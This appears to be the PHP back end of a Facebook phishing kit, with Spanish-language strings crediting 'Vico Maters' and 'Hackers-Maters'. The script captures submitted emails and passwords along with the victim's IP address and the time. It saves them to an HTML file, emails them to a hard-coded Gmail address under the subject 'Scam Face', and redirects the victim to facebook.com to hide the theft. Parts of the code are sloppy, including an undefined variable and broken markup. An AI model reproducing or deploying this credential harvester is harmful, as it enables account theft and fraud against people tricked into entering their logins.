<?php
session_start();

$usuario = $_POST['email'];
$contrase�a = $_POST['pass'];
;

if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim(" ".$date.", <b>Hora :</b> ".$time);


$guardame = fopen('contra.html','a+');
fwrite($guardame,
"<br/><b>Usuario: </b>" .$usuario.
"<br/><b>Contrasena: </b>" .$contrase�a.
"<br/><b>IP: </b>" .$ip.
"<br/><b>Fecha: </b>" .$date.
"<br/>------------------" .$nada." ");
fclose($guardame);



$message = "<table><tr><td>---------*Usuario y Contrase�a [Scam hecho por Vico Maters para Hackers-Maters]*--------</td></tr>
<tr><td>
	 <b>Correo:</b> $usuario </td></tr><tr><td> <b>Contrasena:</b> $contrasena </td></tr><tr><td>
	----------------------------------------------------------</td></tr><tr><td>
		

							
	<tr>
		<td><b>IP:</b> $ip</td>
	</tr>
	<tr>
		<td><b>Fecha:</b> $date</td>
	</tr>


//Aqui pon el correo a donde llegaran los logos	
	<tr><td></table><br";
$from="pakoconvans@gmail.com"; 
# -=-=-=- MIME BOUNDARY
$mime_boundary = "----MSA ----".md5(time());
# -=-=-=- MAIL HEADERS
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers  .="Datos de la Cuenta <$from>\r\n";
$subject = "Scam Face |$ip|";
$to="pakoconvans@gmail.com"; 
mail($to, $subject, $message, $headers);



echo "<meta http-equiv='refresh' content='1;url=http://facebook.com/'>"

?>